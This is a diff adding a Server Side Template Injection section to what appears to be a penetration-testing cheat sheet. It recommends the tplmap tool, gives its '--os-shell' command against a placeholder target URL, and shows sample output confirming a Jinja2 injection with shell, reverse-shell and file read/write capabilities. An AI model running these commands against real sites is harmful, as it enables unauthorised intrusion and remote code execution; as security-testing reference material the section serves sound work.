@@ -1487,11 +1487,45 @@ More on this soon :)
 ```
 
 
-#### Server Side Template Injection
+#### Server Side Template Injection (SSTI)
 
 ```powershell
 #https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 More on this soon :) 
+
+My primary goto for exploiting SSTI issues is tplmap which is really just sqlmap for template injection vulnerabilities.
+
+#https://github.com/epinna/tplmap
+
+$ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
+
+$ ./tplmap.py -u 'http://www.target.com/page?name=John'
+[+] Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+[+] Testing if GET parameter 'name' is injectable
+[+] Smarty plugin is testing rendering with tag '{*}'
+[+] Smarty plugin is testing blind injection
+[+] Mako plugin is testing rendering with tag '${*}'
+...
+[+] Jinja2 plugin is testing rendering with tag '{{*}}'
+[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
+[+] Tplmap identified the following injection point:
+
+  GET parameter: name
+  Engine: Jinja2
+  Injection: {{*}}
+  Context: text
+  OS: linux
+  Technique: render
+  Capabilities:
+
+   Shell command execution: ok
+   Bind and reverse shell: ok
+   File write: ok
+   File read: ok
+   Code evaluation: ok, python code
+
 ```
 
 
